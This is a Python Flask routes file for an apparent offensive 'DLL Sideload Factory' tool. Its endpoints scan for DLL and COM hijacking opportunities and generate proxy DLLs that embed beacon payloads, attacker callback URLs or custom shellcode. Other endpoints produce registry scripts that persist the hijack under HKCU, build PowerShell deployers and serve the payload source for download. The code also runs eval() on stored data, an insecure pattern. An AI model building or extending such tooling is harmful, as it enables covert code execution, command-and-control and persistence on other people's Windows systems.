"""
Flask routes for DLL Sideload Factory module
COM Hijacking & DLL Sideloading for Advanced Persistence
"""

from flask import Blueprint, render_template, request, jsonify, send_file
import sys
import os
import tempfile
import io

# Add tools directory to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

from dll_sideload_factory import (
    get_factory, DLLTarget, HijackType, PayloadType
)

dll_sideload_bp = Blueprint('dll_sideload', __name__, url_prefix='/dll-sideload')


@dll_sideload_bp.route('/')
def index():
    """DLL Sideload Factory main page"""
    factory = get_factory()
    stats = factory.get_stats()
    targets = factory.get_targets()
    com_targets = factory.get_com_targets()
    generated = factory.get_generated_dlls()
    
    return render_template('dll_sideload.html',
                           stats=stats,
                           targets=targets[:20],
                           com_targets=com_targets[:10],
                           generated=generated[:10],
                           hijack_types=[t.value for t in HijackType],
                           payload_types=[p.value for p in PayloadType],
                           vulnerable_apps=list(factory.VULNERABLE_APPS.keys()))


@dll_sideload_bp.route('/api/scan', methods=['POST'])
def scan_opportunities():
    """Scan for DLL hijacking opportunities"""
    try:
        data = request.get_json() or {}
        target_apps = data.get('target_apps')  # List or None for all
        
        factory = get_factory()
        targets = factory.scan_for_opportunities(target_apps)
        
        return jsonify({
            'success': True,
            'count': len(targets),
            'targets': [
                {
                    'target_id': t.target_id,
                    'application': t.application,
                    'dll_name': t.dll_name,
                    'hijack_type': t.hijack_type.value,
                    'risk_level': t.risk_level,
                    'exports_count': len(t.exports)
                }
                for t in targets
            ]
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@dll_sideload_bp.route('/api/scan-com', methods=['POST'])
def scan_com_opportunities():
    """Scan for COM hijacking opportunities"""
    try:
        factory = get_factory()
        targets = factory.scan_com_hijack_opportunities()
        
        return jsonify({
            'success': True,
            'count': len(targets),
            'targets': [
                {
                    'clsid': t.clsid,
                    'progid': t.progid,
                    'application': t.application,
                    'hijack_location': t.hijack_location,
                    'notes': t.notes
                }
                for t in targets
            ]
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@dll_sideload_bp.route('/api/generate-dll', methods=['POST'])
def generate_dll():
    """Generate a proxy DLL with embedded payload"""
    try:
        data = request.get_json()
        target_id = data.get('target_id')
        payload_type = data.get('payload_type', 'beacon')
        callback_url = data.get('callback_url')
        custom_shellcode = data.get('shellcode')  # Base64 encoded
        
        factory = get_factory()
        
        # Get target from database
        targets = factory.get_targets()
        target_dict = next((t for t in targets if t['target_id'] == target_id), None)
        
        if not target_dict:
            return jsonify({'success': False, 'error': 'Target not found'}), 404
        
        # Recreate target object
        target = DLLTarget(
            target_id=target_dict['target_id'],
            application=target_dict['application'],
            app_path=target_dict['app_path'],
            dll_name=target_dict['dll_name'],
            hijack_type=HijackType(target_dict['hijack_type']),
            exports=eval(target_dict['exports']) if target_dict['exports'] else []
        )
        
        # Parse shellcode if provided
        shellcode_bytes = None
        if custom_shellcode:
            import base64
            shellcode_bytes = base64.b64decode(custom_shellcode)
        
        # Generate DLL
        generated = factory.generate_proxy_dll(
            target=target,
            payload_type=PayloadType(payload_type),
            callback_url=callback_url,
            custom_shellcode=shellcode_bytes
        )
        
        return jsonify({
            'success': True,
            'dll_id': generated.dll_id,
            'dll_name': target.dll_name,
            'payload_type': generated.payload_type.value,
            'source_code': generated.source_code,
            'exports_count': len(generated.original_exports)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@dll_sideload_bp.route('/api/generate-com-reg', methods=['POST'])
def generate_com_reg():
    """Generate registry script for COM hijacking"""
    try:
        data = request.get_json()
        clsid = data.get('clsid')
        progid = data.get('progid', '')
        dll_path = data.get('dll_path')
        
        if not clsid or not dll_path:
            return jsonify({'success': False, 'error': 'clsid and dll_path required'}), 400
        
        factory = get_factory()
        
        from dll_sideload_factory import COMTarget
        target = COMTarget(
            clsid=clsid,
            progid=progid,
            dll_path='',
            hijack_location='HKCU',
            application=''
        )
        
        reg_script = factory.generate_com_hijack_reg(target, dll_path)
        
        return jsonify({
            'success': True,
            'reg_script': reg_script
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@dll_sideload_bp.route('/api/generate-deployer', methods=['POST'])
def generate_deployer():
    """Generate PowerShell deployment script"""
    try:
        data = request.get_json()
        dll_id = data.get('dll_id')
        
        factory = get_factory()
        
        # Get generated DLL info
        generated_dlls = factory.get_generated_dlls()
        dll_info = next((d for d in generated_dlls if d['dll_id'] == dll_id), None)
        
        if not dll_info:
            return jsonify({'success': False, 'error': 'Generated DLL not found'}), 404
        
        # Get target info
        targets = factory.get_targets()
        target_dict = next((t for t in targets if t['target_id'] == dll_info['target_id']), None)
        
        if not target_dict:
            return jsonify({'success': False, 'error': 'Target not found'}), 404
        
        # Recreate objects
        target = DLLTarget(
            target_id=target_dict['target_id'],
            application=target_dict['application'],
            app_path=target_dict['app_path'],
            dll_name=target_dict['dll_name'],
            hijack_type=HijackType(target_dict['hijack_type'])
        )
        
        from dll_sideload_factory import GeneratedDLL
        generated = GeneratedDLL(
            dll_id=dll_info['dll_id'],
            target=target,
            payload_type=PayloadType(dll_info['payload_type']),
            original_exports=[],
            source_code=dll_info['source_code']
        )
        
        ps_script = factory.generate_powershell_deployer(generated)
        
        return jsonify({
            'success': True,
            'script': ps_script,
            'filename': f"deploy_{target.dll_name.replace('.dll', '')}.ps1"
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@dll_sideload_bp.route('/api/download-source/<dll_id>')
def download_source(dll_id):
    """Download generated DLL source code"""
    try:
        factory = get_factory()
        generated_dlls = factory.get_generated_dlls()
        dll_info = next((d for d in generated_dlls if d['dll_id'] == dll_id), None)
        
        if not dll_info:
            return jsonify({'success': False, 'error': 'Not found'}), 404
        
        source_code = dll_info['source_code']
        
        return send_file(
            io.BytesIO(source_code.encode()),
            mimetype='text/plain',
            as_attachment=True,
            download_name=f"proxy_{dll_info['dll_name']}.c"
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@dll_sideload_bp.route('/api/targets')
def list_targets():
    """List all discovered targets"""
    factory = get_factory()
    targets = factory.get_targets()
    return jsonify({'success': True, 'targets': targets})


@dll_sideload_bp.route('/api/generated')
def list_generated():
    """List all generated DLLs"""
    factory = get_factory()
    generated = factory.get_generated_dlls()
    return jsonify({'success': True, 'generated': generated})


@dll_sideload_bp.route('/api/stats')
def get_stats():
    """Get factory statistics"""
    factory = get_factory()
    return jsonify({'success': True, 'stats': factory.get_stats()})
